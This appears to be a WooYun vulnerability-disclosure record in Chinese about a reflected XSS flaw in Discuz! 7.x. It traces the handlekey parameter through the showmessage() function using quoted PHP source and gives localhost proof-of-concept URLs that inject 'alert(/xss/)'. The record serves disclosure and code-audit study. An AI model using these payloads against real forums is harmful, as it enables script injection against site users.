{"id": 48314, "wybug_id": "wooyun-2014-084097", "wybug_title": "Discuz!7.X系列一处问题可导致反射型XSS（大多文件均可触发）", "wybug_corp": "Discuz!", "wybug_author": "xfkxfk", "wybug_date": "2014-11-24 11:14", "wybug_open_date": "2014-12-31 11:16", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-29：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向公众公开  简要描述： Discuz! 7.X系列一处问题引发大面积XSS，基本上全部页面和文件都能触发 详细说明：  亲测Discuz! 7.2,7.1,7.0三个版本都受影响都是因为同一原因，导致可在全部页面触发xss漏洞这里拿Discuz! 7.2做分析比如Discuz! 7.2安装包里面的第二个文件就是ajax.php\ndefine('CURSCRIPT', 'ajax');define('NOROBOT', TRUE);require_once './include/common.inc.php';if($action == 'updatesecqaa') {\t$message = '';\tif($secqaa) {\t\trequire_once DISCUZ_ROOT.'./forumdata/cache/cache_secqaa.php';\t\t$secqaa = max(1, random(1, 1));\t\t$message = $_DCACHE['secqaa'][$secqaa]['question'];\t\tif($seclevel) {\t\t\t$seccode = $secqaa * 1000000 + substr($seccode, -6);\t\t\tupdatesession();\t\t} else {\t\t\tdsetcookie('secq', authcode($secqaa.\"\\t\".$timestamp.\"\\t\".$discuz_uid, 'ENCODE'), 3600);\t\t}\t}\tshowmessage($message);\n注意这里的最后一行的showmessage函数，我们跟进include/global.func.php文件\nfunction showmessage($message, $url_forward = '', $extra = '', $forwardtype = 0) {\textract($GLOBALS, EXTR_SKIP);\tglobal $hookscriptmessage, $extrahead, $discuz_uid, $discuz_action, $debuginfo, $seccode, $seccodestatus, $fid, $tid, $charset, $show_message, $inajax, $_DCACHE, $advlist;\tdefine('CACHE_FORBIDDEN', TRUE);......include language('messages');\t$vars = explode(':', $message);\tif(count($vars) == 2 && isset($scriptlang[$vars[0]][$vars[1]])) {\t\teval(\"\\$show_message = \\\"\".str_replace('\"', '\\\"', $scriptlang[$vars[0]][$vars[1]]).\"\\\";\");\t} elseif(isset($language[$message])) {\t\t$pre = $inajax ? 'ajax_' : '';\t\teval(\"\\$show_message = \\\"\".(isset($language[$pre.$message]) ? $language[$pre.$message] : $language[$message]).\"\\\";\");\t\tunset($pre);\t}\tif(empty($infloat)) {\t\t$show_message .= $url_forward && empty($inajax) ? '<script>setTimeout(\"window.location.href =\\''.$url_forward.'\\';\", '.$msgforward['refreshtime'].');</script>' : '';\t} elseif($handlekey) {\t\t$show_message = str_replace(\"'\", \"\\'\", $show_message);\t\tif($url_forward) {\t\t\t$show_message = \"<script type=\\\"text/javascript\\\" reload=\\\"1\\\">\\nif($('return_$handlekey')) $('return_$handlekey').className = 'onright';\\nif(typeof submithandle_$handlekey =='function') {submithandle_$handlekey('$url_forward', '$show_message');} else {location.href='$url_forward'}\\n</script>\";\t\t} else {\t\t\t$show_message .= \"<script type=\\\"text/javascript\\\" reload=\\\"1\\\">\\nif(typeof messagehandle_$handlekey =='function') {messagehandle_$handlekey('$messagehandle', '$show_message');}\\n</script>\";\t\t}\t}if($advlist = array_merge($globaladvs ? $globaladvs['type'] : array(), $redirectadvs ? $redirectadvs['type'] : array())) {\t\t$advitems = ($globaladvs ? $globaladvs['items'] : array()) + ($redirectadvs ? $redirectadvs['items'] : array());\t\tforeach($advlist AS $type => $redirectadvs) {\t\t\t$advlist[$type] = $advitems[$redirectadvs[array_rand($redirectadvs)]];\t\t}\t}\tif($extra == 'NOPERM') {\t\tinclude template('nopermission');\t} else {\t\tinclude template('showmessage');\t}\tdexit();}\n这里当$infloat和$handlekey不为空，都存在的话将$show_message赋值，且$handlekey进入$show_message的内容中最后include template('showmessage');$show_message内容在showmessage.htm模板里面显示：\n<script type=\"text/javascript\" reload=\"1\">\tfunction ajaxerror() {\t\thideMenu();\t\tshowDialog('$show_message', 'notice', '', null, 0);\t}\tajaxerror();\t</script>\n所以通过上面的分析，变量$handlekey进入$show_message的内容中时只是过滤了单引号，但是在$show_message装那个并没有用到单引号保护变量所以这里变量$handlekey就等于没有通过过滤直接最后显示在页面中了这样就导致了xss漏洞为什么前面会说全部页面都会触发咧因为这里的函数showmessage，是一个全局的消息传递函数，基本上在所有的页面都会用因为这是一个消息传递函数，无所谓登陆与否了，只要满足$infloat和$handlekey不为空，就能出发XSS漏洞所有一个小问题却导致了整个系统都存在漏洞，这就不是小漏洞了   漏洞证明：  \nhttp://localhost/Discuz_7.2_FULL_SC_UTF8/admincp.php?infloat=yes&handlekey=123);alert(/xss/);//\n\n\n\nhttp://localhost/Discuz_7.2_FULL_SC_UTF8/ajax.php?infloat=yes&handlekey=123);alert(/xss/);//\n\n\n\nhttp://localhost/Discuz_7.2_FULL_SC_UTF8/announcement.php?infloat=yes&handlekey=123);alert(/xss/);//http://localhost/Discuz_7.2_FULL_SC_UTF8/attachment.php?infloat=yes&handlekey=123);alert(/xss/);//http://localhost/Discuz_7.2_FULL_SC_UTF8/member.php?infloat=yes&handlekey=123);alert(/xss/);//等等......\n其他的就不一一列举了   修复方案：  加个过滤即可   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-31 11:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-31 12:52 |    \t\txiaogui \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:24        | 围观大牛来了~~~)\t\t \n  这么适合新手学习的文章竟然没有跟帖，果然这里大牛如云    \n     2014-12-31 13:28 |    \t\t鬼五 \t\t\t( 普通白帽子  |\t\t\t        Rank:214 漏洞数:83        )\t\t \n  注意这里的最后一行的showmessage函数，我们跟进看到好多代码审计文章都会有跟进函数，是怎么跟进函数的呢？用软件还是？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}